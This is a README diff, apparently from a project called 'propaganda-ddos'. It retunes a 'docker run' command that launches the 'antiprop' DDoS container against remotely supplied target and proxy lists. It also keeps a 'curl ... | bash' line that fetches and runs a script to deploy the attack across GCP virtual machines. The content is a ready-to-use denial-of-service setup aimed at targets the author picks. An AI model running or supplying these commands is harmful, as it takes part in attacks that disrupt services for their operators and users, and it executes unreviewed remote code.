@@ -13,8 +13,8 @@
 ### [Проксі та цілі для атаки за замовчуванням (оновлює автор)](https://github.com/meddion/propaganda-ddos/tree/sources)
 
 ```bash
-docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=69 \
---dnsres=true --errcount=69 --onlyproxy=false --bots 69 --checkproxy=true \
+docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=20 \
+--dnsres=true --errcount=9 --onlyproxy=false --bots 10 --checkproxy=true \
 https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
 https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
 ```
@@ -25,6 +25,8 @@ docker logs antiprop -f
 
 
 ### Запуск в GCP VMs / Run in GCP VMs
+[Antiprop on Docker Hub](https://hub.docker.com/repository/docker/lovefromukraine/antiprop)
+
 Дивись файл micro_vms_gcp.sh / Look into micro_vms_gcp.sh
 ```bash
 curl https://raw.githubusercontent.com/meddion/propaganda-ddos/main/micro_vms_gcp.sh | bash -s 10 
